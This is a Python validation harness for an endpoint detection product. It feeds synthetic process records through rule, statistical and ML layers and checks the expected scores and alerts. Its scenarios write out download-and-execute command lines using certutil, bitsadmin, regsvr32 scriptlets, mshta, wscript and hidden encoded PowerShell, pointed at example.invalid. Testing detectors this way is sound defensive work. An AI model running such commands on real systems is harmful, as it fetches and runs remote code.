from __future__ import annotations

import csv
import json
import time
import uuid

from pathlib import Path


from config import (
    IS_VALIDATION_MODE,
)

from endpoint.collectors.fusion_v3_primary_process_monitor import (
    FusionV3PrimaryProcessMonitor,
)

from endpoint.storage.database import (
    initialize_database,
)

import validation.process.powershell_batch_runner as base


# ================================================================
# CONFIG
# ================================================================

RUN_ID = (
    "PROCESS-P2-P4-"
    + uuid.uuid4().hex[:8].upper()
)


base.VALIDATION_RUN_ID = (
    RUN_ID
)


REPORT_DIR = (
    Path(__file__)
    .resolve()
    .parents[1]
    / "reports"
)


REPORT_DIR.mkdir(
    parents=True,
    exist_ok=True,
)


# ================================================================
# EXECUTABLE PATHS
# ================================================================

EXECUTABLE_PATHS = {

    "cmd.exe":
        r"C:\Windows\System32\cmd.exe",

    "wscript.exe":
        r"C:\Windows\System32\wscript.exe",

    "cscript.exe":
        r"C:\Windows\System32\cscript.exe",

    "mshta.exe":
        r"C:\Windows\System32\mshta.exe",

    "certutil.exe":
        r"C:\Windows\System32\certutil.exe",

    "bitsadmin.exe":
        r"C:\Windows\System32\bitsadmin.exe",

    "rundll32.exe":
        r"C:\Windows\System32\rundll32.exe",

    "regsvr32.exe":
        r"C:\Windows\System32\regsvr32.exe",
}


# ================================================================
# PROCESS BUILDER
# ================================================================

def process(
    *,
    pid: int,
    name: str,
    command: str,
    parent: str = "explorer.exe",
):

    return {

        "pid":
            pid,

        "ppid":
            993000,

        "name":
            name,

        "exe":
            EXECUTABLE_PATHS.get(
                name,
                rf"C:\Windows\System32\{name}",
            ),

        "cmdline":
            command,

        "parent_name":
            parent,

        "username":
            "sentinel-validation",

        "create_time":
            time.time() - 5.0,

        "cpu_percent":
            0.5,

        "memory_percent":
            0.2,

        "rss_mb":
            40.0,

        "num_threads":
            7,

        "num_handles":
            100,
    }


# ================================================================
# SCENARIOS
# ================================================================

SCENARIOS = [

    # ============================================================
    # P2 — CMD / SCRIPT
    # ============================================================

    {
        "id": "P2-01",
        "family": "CMD_SCRIPT",
        "name": "Benign CMD directory listing",

        "process": process(
            pid=993201,
            name="cmd.exe",
            command="cmd.exe /c dir C:\\Windows",
        ),

        "exact_rule": 5,
        "rule_suspicious": False,
        "expected_alert": False,
    },


    {
        "id": "P2-02",
        "family": "CMD_SCRIPT",
        "name": "Benign CMD whoami",

        "process": process(
            pid=993202,
            name="cmd.exe",
            command="cmd.exe /c whoami",
        ),

        "exact_rule": 5,
        "rule_suspicious": False,
        "expected_alert": False,
    },


    {
        "id": "P2-03",
        "family": "CMD_SCRIPT",
        "name": "Benign local WScript",

        "process": process(
            pid=993203,
            name="wscript.exe",
            command=(
                "wscript.exe "
                "C:\\Scripts\\maintenance.vbs"
            ),
        ),

        "exact_rule": 5,
        "rule_suspicious": False,
        "expected_alert": False,
    },


    {
        "id": "P2-04",
        "family": "CMD_SCRIPT",
        "name": "Benign local CScript",

        "process": process(
            pid=993204,
            name="cscript.exe",
            command=(
                "cscript.exe "
                "C:\\Scripts\\inventory.vbs"
            ),
        ),

        "exact_rule": 5,
        "rule_suspicious": False,
        "expected_alert": False,
    },


    {
        "id": "P2-05",
        "family": "CMD_SCRIPT",
        "name": "CMD launches encoded PowerShell",

        "process": process(
            pid=993205,
            name="cmd.exe",
            command=(
                "cmd.exe /c "
                "powershell.exe "
                "-EncodedCommand "
                "SYNTHETIC_PAYLOAD"
            ),
        ),

        "exact_rule": 35,
        "rule_suspicious": True,

        # We only validate rule detection here.
        "expected_alert": None,
    },


    {
        "id": "P2-06",
        "family": "CMD_SCRIPT",
        "name": "CMD launches hidden encoded PowerShell",

        "process": process(
            pid=993206,
            name="cmd.exe",
            command=(
                "cmd.exe /c "
                "powershell.exe "
                "-WindowStyle Hidden "
                "-EncodedCommand "
                "SYNTHETIC_PAYLOAD"
            ),
        ),

        "exact_rule": 50,
        "rule_suspicious": True,
        "expected_alert": None,
    },


    {
        "id": "P2-07",
        "family": "CMD_SCRIPT",
        "name": "Remote WScript payload",

        "process": process(
            pid=993207,
            name="wscript.exe",
            command=(
                "wscript.exe "
                "https://example.invalid/script.vbs"
            ),
        ),

        # 5 monitored
        # +15 URL
        # +55 remote script
        "exact_rule": 75,

        "rule_suspicious": True,

        "expected_alert": True,

        "expected_threat":
            "WSCRIPT_REMOTE_SCRIPT",
    },


    {
        "id": "P2-08",
        "family": "CMD_SCRIPT",
        "name": "Remote MSHTA payload",

        "process": process(
            pid=993208,
            name="mshta.exe",
            command=(
                "mshta.exe "
                "https://example.invalid/page.hta"
            ),
        ),

        "exact_rule": 75,

        "rule_suspicious": True,

        "expected_alert": True,

        "expected_threat":
            "MSHTA_REMOTE_PAYLOAD",
    },


    # ============================================================
    # P3 — LOLBINS
    # ============================================================

    {
        "id": "P3-01",
        "family": "LOLBIN",
        "name": "Benign CertUtil hash operation",

        "process": process(
            pid=993301,
            name="certutil.exe",
            command=(
                "certutil.exe "
                "-hashfile C:\\Temp\\sample.txt SHA256"
            ),
        ),

        "exact_rule": 5,
        "rule_suspicious": False,
        "expected_alert": False,
    },


    {
        "id": "P3-02",
        "family": "LOLBIN",
        "name": "CertUtil remote download",

        "process": process(
            pid=993302,
            name="certutil.exe",
            command=(
                "certutil.exe "
                "-urlcache -split -f "
                "https://example.invalid/a.bin "
                "C:\\Temp\\a.bin"
            ),
        ),

        "exact_rule": 75,

        "rule_suspicious": True,

        "expected_alert": True,

        "expected_threat":
            "CERTUTIL_DOWNLOAD",
    },


    {
        "id": "P3-03",
        "family": "LOLBIN",
        "name": "BITSAdmin remote transfer",

        "process": process(
            pid=993303,
            name="bitsadmin.exe",
            command=(
                "bitsadmin.exe "
                "/transfer validationJob "
                "https://example.invalid/file.bin "
                "C:\\Temp\\file.bin"
            ),
        ),

        "exact_rule": 75,

        "rule_suspicious": True,

        "expected_alert": True,

        "expected_threat":
            "BITSADMIN_TRANSFER",
    },


    {
        "id": "P3-04",
        "family": "LOLBIN",
        "name": "Benign Rundll32 control panel",

        "process": process(
            pid=993304,
            name="rundll32.exe",
            command=(
                "rundll32.exe "
                "shell32.dll,Control_RunDLL"
            ),
        ),

        "exact_rule": 5,
        "rule_suspicious": False,
        "expected_alert": False,
    },


    {
        "id": "P3-05",
        "family": "LOLBIN",
        "name": "Rundll32 script execution",

        "process": process(
            pid=993305,
            name="rundll32.exe",
            command=(
                "rundll32.exe "
                "javascript:SYNTHETIC_VALIDATION"
            ),
        ),

        "exact_rule": 75,

        "rule_suspicious": True,

        "expected_alert": True,

        "expected_threat":
            "RUNDLL32_SCRIPT_EXECUTION",
    },


    {
        "id": "P3-06",
        "family": "LOLBIN",
        "name": "Regsvr32 remote scriptlet",

        "process": process(
            pid=993306,
            name="regsvr32.exe",
            command=(
                "regsvr32.exe "
                "/s /n /u "
                "/i:https://example.invalid/a.sct "
                "scrobj.dll"
            ),
        ),

        "exact_rule": 75,

        "rule_suspicious": True,

        "expected_alert": True,

        "expected_threat":
            "REGSVR32_REMOTE_SCRIPTLET",
    },


    {
        "id": "P3-07",
        "family": "LOLBIN",
        "name": "Benign local MSHTA",

        "process": process(
            pid=993307,
            name="mshta.exe",
            command=(
                "mshta.exe "
                "C:\\Internal\\approved.hta"
            ),
        ),

        "exact_rule": 5,
        "rule_suspicious": False,
        "expected_alert": False,
    },


    {
        "id": "P3-08",
        "family": "LOLBIN",
        "name": "Remote MSHTA execution",

        "process": process(
            pid=993308,
            name="mshta.exe",
            command=(
                "mshta.exe "
                "https://example.invalid/remote.hta"
            ),
        ),

        "exact_rule": 75,

        "rule_suspicious": True,

        "expected_alert": True,

        "expected_threat":
            "MSHTA_REMOTE_PAYLOAD",
    },


    # ============================================================
    # P4 — PARENT / CHILD
    # ============================================================

    {
        "id": "P4-01",
        "family": "PARENT_CHILD",
        "name": "Explorer launches CMD",

        "process": process(
            pid=993401,
            name="cmd.exe",
            parent="explorer.exe",
            command="cmd.exe /c dir",
        ),

        "exact_rule": 5,
        "rule_suspicious": False,
        "expected_alert": False,
    },


    {
        "id": "P4-02",
        "family": "PARENT_CHILD",
        "name": "Explorer launches local WScript",

        "process": process(
            pid=993402,
            name="wscript.exe",
            parent="explorer.exe",
            command=(
                "wscript.exe "
                "C:\\Scripts\\approved.vbs"
            ),
        ),

        "exact_rule": 5,
        "rule_suspicious": False,
        "expected_alert": False,
    },


    {
        "id": "P4-03",
        "family": "PARENT_CHILD",
        "name": "Word launches CMD",

        "process": process(
            pid=993403,
            name="cmd.exe",
            parent="winword.exe",
            command="cmd.exe /c whoami",
        ),

        "exact_rule": 45,

        "rule_suspicious": True,

        "expected_alert": None,
    },


    {
        "id": "P4-04",
        "family": "PARENT_CHILD",
        "name": "Excel launches WScript",

        "process": process(
            pid=993404,
            name="wscript.exe",
            parent="excel.exe",
            command=(
                "wscript.exe "
                "C:\\Temp\\script.vbs"
            ),
        ),

        "exact_rule": 45,

        "rule_suspicious": True,

        "expected_alert": None,
    },


    {
        "id": "P4-05",
        "family": "PARENT_CHILD",
        "name": "Outlook launches CMD",

        "process": process(
            pid=993405,
            name="cmd.exe",
            parent="outlook.exe",
            command="cmd.exe /c whoami",
        ),

        "exact_rule": 45,

        "rule_suspicious": True,

        "expected_alert": None,
    },


    {
        "id": "P4-06",
        "family": "PARENT_CHILD",
        "name": "Word launches encoded CMD chain",

        "process": process(
            pid=993406,
            name="cmd.exe",
            parent="winword.exe",
            command=(
                "cmd.exe /c "
                "powershell.exe "
                "-EncodedCommand "
                "SYNTHETIC_DOCUMENT_PAYLOAD"
            ),
        ),

        "exact_rule": 75,

        "rule_suspicious": True,

        "expected_alert": True,

        "expected_threat":
            "DOCUMENT_TO_CMD",
    },


    {
        "id": "P4-07",
        "family": "PARENT_CHILD",
        "name": "Excel launches remote WScript",

        "process": process(
            pid=993407,
            name="wscript.exe",
            parent="excel.exe",
            command=(
                "wscript.exe "
                "https://example.invalid/script.vbs"
            ),
        ),

        # 5 monitored
        # +40 document parent
        # +15 URL
        # +55 remote execution
        # = 115 -> capped to 100
        "exact_rule": 100,

        "rule_suspicious": True,

        "expected_alert": True,

        "expected_threat":
            "DOCUMENT_TO_WSCRIPT",
    },


    {
        "id": "P4-08",
        "family": "PARENT_CHILD",
        "name": "Outlook launches remote MSHTA",

        "process": process(
            pid=993408,
            name="mshta.exe",
            parent="outlook.exe",
            command=(
                "mshta.exe "
                "https://example.invalid/mail.hta"
            ),
        ),

        "exact_rule": 100,

        "rule_suspicious": True,

        "expected_alert": True,

        "expected_threat":
            "DOCUMENT_TO_MSHTA",
    },
]


# ================================================================
# VALIDATE RESULT
# ================================================================

def validate_case(
    scenario,
    result,
):

    failures = []


    rule = (
        result.get(
            "rule",
            {}
        )
        or {}
    )


    statistical = (
        result.get(
            "statistical",
            {}
        )
        or {}
    )


    isolation = (
        result.get(
            "isolation_forest",
            {}
        )
        or {}
    )


    autoencoder = (
        result.get(
            "autoencoder",
            {}
        )
        or {}
    )


    fusion = (
        result.get(
            "fusion",
            {}
        )
        or {}
    )


    detections = (
        result.get(
            "detections",
            []
        )
        or []
    )


    actual_rule = (
        rule.get(
            "behavior_score"
        )
    )


    # ============================================================
    # RULE SCORE
    # ============================================================

    expected_rule = (
        scenario.get(
            "exact_rule"
        )
    )


    if (
        expected_rule
        is not None

        and

        actual_rule
        != expected_rule
    ):

        failures.append(
            {
                "layer":
                    "RULE",

                "reason":
                    "RULE_SCORE_MISMATCH",

                "expected":
                    expected_rule,

                "actual":
                    actual_rule,
            }
        )


    # ============================================================
    # RULE FLAG
    # ============================================================

    expected_suspicious = (
        scenario.get(
            "rule_suspicious"
        )
    )


    if (
        expected_suspicious
        is not None
    ):

        actual_suspicious = bool(
            rule.get(
                "suspicious",
                False,
            )
        )


        if (
            actual_suspicious
            != expected_suspicious
        ):

            failures.append(
                {
                    "layer":
                        "RULE",

                    "reason":
                        "RULE_SUSPICIOUS_MISMATCH",

                    "expected":
                        expected_suspicious,

                    "actual":
                        actual_suspicious,
                }
            )


    # ============================================================
    # STATISTICAL
    # ============================================================

    if bool(
        statistical.get(
            "anomalous",
            False,
        )
    ):

        failures.append(
            {
                "layer":
                    "STATISTICAL",

                "reason":
                    "UNEXPECTED_STATISTICAL_ANOMALY",

                "score":
                    statistical.get(
                        "anomaly_score"
                    ),
            }
        )


    # ============================================================
    # MODEL AVAILABILITY
    # ============================================================

    if not isolation.get(
        "available",
        False,
    ):

        failures.append(
            {
                "layer":
                    "ISOLATION_FOREST",

                "reason":
                    "MODEL_UNAVAILABLE",
            }
        )


    if not autoencoder.get(
        "available",
        False,
    ):

        failures.append(
            {
                "layer":
                    "AUTOENCODER",

                "reason":
                    "MODEL_UNAVAILABLE",
            }
        )


    # ============================================================
    # FUSION ALERT
    # ============================================================

    expected_alert = (
        scenario.get(
            "expected_alert"
        )
    )


    if expected_alert is not None:

        actual_alert = bool(
            fusion.get(
                "should_alert",
                False,
            )
        )


        if (
            actual_alert
            != expected_alert
        ):

            failures.append(
                {
                    "layer":
                        "FUSION",

                    "reason":
                        "ALERT_POLICY_MISMATCH",

                    "expected":
                        expected_alert,

                    "actual":
                        actual_alert,

                    "fusion_score":
                        fusion.get(
                            "fusion_score"
                    ),
                }
            )


        # ========================================================
        # BENIGN SHOULD NOT STORE
        # ========================================================

        if (
            expected_alert is False

            and

            detections
        ):

            failures.append(
                {
                    "layer":
                        "PERSISTENCE",

                    "reason":
                        "FALSE_POSITIVE_STORED",

                    "count":
                        len(
                            detections
                        ),
                }
            )


        # ========================================================
        # MALICIOUS SHOULD STORE
        # ========================================================

        if (
            expected_alert is True

            and

            not detections
        ):

            failures.append(
                {
                    "layer":
                        "PERSISTENCE",

                    "reason":
                        "EXPECTED_DETECTION_NOT_STORED",
                }
            )


    # ============================================================
    # THREAT TYPE
    # ============================================================

    expected_threat = (
        scenario.get(
            "expected_threat"
        )
    )


    if (
        expected_threat

        and

        detections
    ):

        actual_threat = (
            detections[
                -1
            ].get(
                "threat_type"
            )
        )


        if (
            actual_threat
            != expected_threat
        ):

            failures.append(
                {
                    "layer":
                        "CLASSIFICATION",

                    "reason":
                        "THREAT_TYPE_MISMATCH",

                    "expected":
                        expected_threat,

                    "actual":
                        actual_threat,
                }
            )


    # ============================================================
    # LIVE ISOLATION
    # ============================================================

    if not result.get(
        "live_isolation_ok",
        False,
    ):

        failures.append(
            {
                "layer":
                    "ISOLATION",

                "reason":
                    "SYNTHETIC_INCREMENTED_LIVE_COUNTER",
            }
        )


    result[
        "family"
    ] = (
        scenario[
            "family"
        ]
    )


    result[
        "failures"
    ] = failures


    result[
        "passed"
    ] = (
        len(
            failures
        )
        == 0
    )


    return result


# ================================================================
# RUN CASE
# ================================================================

def run_case(
    monitor,
    scenario,
):

    result = (
        base.evaluate_process(

            monitor,

            scenario_id=
                scenario[
                    "id"
                ],

            scenario_name=
                scenario[
                    "name"
                ],

            process_info=
                scenario[
                    "process"
                ],
        )
    )


    return (
        validate_case(
            scenario,
            result,
        )
    )


# ================================================================
# SUMMARY ROW
# ================================================================

def summary_row(
    result,
):

    rule = (
        result.get(
            "rule",
            {}
        )
        or {}
    )


    statistical = (
        result.get(
            "statistical",
            {}
        )
        or {}
    )


    isolation = (
        result.get(
            "isolation_forest",
            {}
        )
        or {}
    )


    autoencoder = (
        result.get(
            "autoencoder",
            {}
        )
        or {}
    )


    fusion = (
        result.get(
            "fusion",
            {}
        )
        or {}
    )


    detections = (
        result.get(
            "detections",
            []
        )
        or []
    )


    detection = (
        detections[-1]
        if detections
        else {}
    )


    failure_layers = sorted(
        {
            failure.get(
                "layer",
                "UNKNOWN",
            )

            for failure
            in result.get(
                "failures",
                []
            )
        }
    )


    return {

        "scenario_id":
            result.get(
                "scenario_id"
            ),

        "family":
            result.get(
                "family"
            ),

        "scenario_name":
            result.get(
                "scenario_name"
            ),

        "rule_score":
            rule.get(
                "behavior_score"
            ),

        "rule_suspicious":
            rule.get(
                "suspicious"
            ),

        "statistical_score":
            statistical.get(
                "anomaly_score"
            ),

        "if_score":
            isolation.get(
                "anomaly_confidence"
            ),

        "if_label":
            isolation.get(
                "anomaly_label"
            ),

        "ae_score":
            autoencoder.get(
                "anomaly_confidence"
            ),

        "ae_label":
            autoencoder.get(
                "anomaly_label"
            ),

        "fusion_score":
            fusion.get(
                "fusion_score"
            ),

        "severity":
            fusion.get(
                "severity"
            ),

        "should_alert":
            fusion.get(
                "should_alert"
            ),

        "stored":
            len(
                detections
            ),

        "engine":
            detection.get(
                "engine"
            ),

        "threat_type":
            detection.get(
                "threat_type"
            ),

        "failure_layers":
            ",".join(
                failure_layers
            ),

        "passed":
            result.get(
                "passed",
                False,
            ),
    }


# ================================================================
# SAVE REPORT
# ================================================================

def save_report(
    results,
):

    rows = [

        summary_row(
            result
        )

        for result
        in results
    ]


    csv_path = (
        REPORT_DIR
        / "cmd_lolbin_parent_validation.csv"
    )


    json_path = (
        REPORT_DIR
        / "cmd_lolbin_parent_validation.json"
    )


    # ============================================================
    # CSV
    # ============================================================

    with open(
        csv_path,
        "w",
        newline="",
        encoding="utf-8",
    ) as handle:

        writer = csv.DictWriter(

            handle,

            fieldnames=list(
                rows[
                    0
                ].keys()
            ),
        )


        writer.writeheader()

        writer.writerows(
            rows
        )


    # ============================================================
    # JSON
    # ============================================================

    payload = {

        "run_id":
            RUN_ID,

        "total":
            len(
                results
            ),

        "passed":
            sum(
                1
                for result
                in results
                if result.get(
                    "passed",
                    False,
                )
            ),

        "failed":
            sum(
                1
                for result
                in results
                if not result.get(
                    "passed",
                    False,
                )
            ),

        "results": [

            {

                "summary":
                    summary_row(
                        result
                    ),

                "failures":
                    result.get(
                        "failures",
                        []
                    ),

                "rule_indicators":
                    (
                        result.get(
                            "rule",
                            {}
                        )
                        or {}
                    ).get(
                        "indicators",
                        []
                    ),

                "rule_reasons":
                    (
                        result.get(
                            "rule",
                            {}
                        )
                        or {}
                    ).get(
                        "reasons",
                        []
                    ),

                "fusion_reasons":
                    (
                        result.get(
                            "fusion",
                            {}
                        )
                        or {}
                    ).get(
                        "reasons",
                        []
                    ),
            }

            for result
            in results
        ],
    }


    with open(
        json_path,
        "w",
        encoding="utf-8",
    ) as handle:

        json.dump(
            payload,
            handle,
            indent=2,
            default=str,
        )


    return (
        rows,
        csv_path,
        json_path,
    )


# ================================================================
# PRINT MATRIX
# ================================================================

def print_matrix(
    rows,
):

    print()

    print(
        "=" * 150
    )

    print(
        "SENTINEL-X CMD + LOLBIN + "
        "PARENT-CHILD VALIDATION"
    )

    print(
        "=" * 150
    )


    print(
        f"{'ID':<8}"
        f"{'Family':<15}"
        f"{'Rule':>7}"
        f"{'IF':>8}"
        f"{'AE':>8}"
        f"{'Fusion':>10}"
        f"{'Severity':>11}"
        f"{'Alert':>8}"
        f"{'Stored':>8}"
        f"{'Final':>8}"
    )


    print(
        "-" * 150
    )


    for row in rows:

        print(
            f"{row['scenario_id']:<8}"
            f"{row['family']:<15}"
            f"{str(row['rule_score']):>7}"
            f"{str(row['if_score']):>8}"
            f"{str(row['ae_score']):>8}"
            f"{str(row['fusion_score']):>10}"
            f"{str(row['severity']):>11}"
            f"{str(row['should_alert']):>8}"
            f"{str(row['stored']):>8}"
            f"{('PASS' if row['passed'] else 'FAIL'):>8}"
        )


    print(
        "=" * 150
    )


# ================================================================
# PRINT FAILURES
# ================================================================

def print_failures(
    results,
):

    failed = [

        result

        for result
        in results

        if not result.get(
            "passed",
            False,
        )
    ]


    print()

    print(
        "=" * 78
    )

    print(
        "FAILURE ANALYSIS"
    )

    print(
        "=" * 78
    )


    if not failed:

        print(
            "No failures."
        )

        return


    for result in failed:

        print()

        print(
            result[
                "scenario_id"
            ],
            "-",
            result[
                "scenario_name"
            ],
        )


        for failure in result.get(
            "failures",
            []
        ):

            print(
                " ",
                failure
            )


        print(
            "  Rule:",
            (
                result.get(
                    "rule",
                    {}
                )
                or {}
            ).get(
                "behavior_score"
            ),
        )


        print(
            "  Indicators:",
            (
                result.get(
                    "rule",
                    {}
                )
                or {}
            ).get(
                "indicators"
            ),
        )


        print(
            "  Fusion:",
            (
                result.get(
                    "fusion",
                    {}
                )
                or {}
            ).get(
                "fusion_score"
            ),
        )


# ================================================================
# MAIN
# ================================================================

def main():

    if not IS_VALIDATION_MODE:

        raise RuntimeError(
            "Run this only in VALIDATION mode."
        )


    initialize_database()


    print(
        "=" * 78
    )

    print(
        "SENTINEL-X P2 + P3 + P4 PROCESS BATCH"
    )

    print(
        "Run:",
        RUN_ID
    )

    print(
        "=" * 78
    )


    # ============================================================
    # LOAD MODELS ONCE
    # ============================================================

    monitor = (
        FusionV3PrimaryProcessMonitor(
            poll_interval=2.0
        )
    )


    results = []


    # ============================================================
    # RUN ALL 24
    # ============================================================

    for scenario in SCENARIOS:

        print(
            f"Running {scenario['id']} "
            f"({scenario['name']})..."
        )


        result = (
            run_case(
                monitor,
                scenario,
            )
        )


        results.append(
            result
        )


    # ============================================================
    # REPORTS
    # ============================================================

    (
        rows,
        csv_path,
        json_path,
    ) = (
        save_report(
            results
        )
    )


    print_matrix(
        rows
    )


    print_failures(
        results
    )


    passed = sum(

        1

        for result
        in results

        if result.get(
            "passed",
            False,
        )
    )


    failed = (
        len(
            results
        )
        - passed
    )


    print()

    print(
        "=" * 78
    )

    print(
        "FINAL SUMMARY"
    )

    print(
        "=" * 78
    )

    print(
        "Passed:",
        passed,
        "/",
        len(
            results
        )
    )

    print(
        "Failed:",
        failed,
        "/",
        len(
            results
        )
    )

    print(
        "CSV:",
        csv_path
    )

    print(
        "JSON:",
        json_path
    )

    print(
        "=" * 78
    )


if __name__ == "__main__":

    main()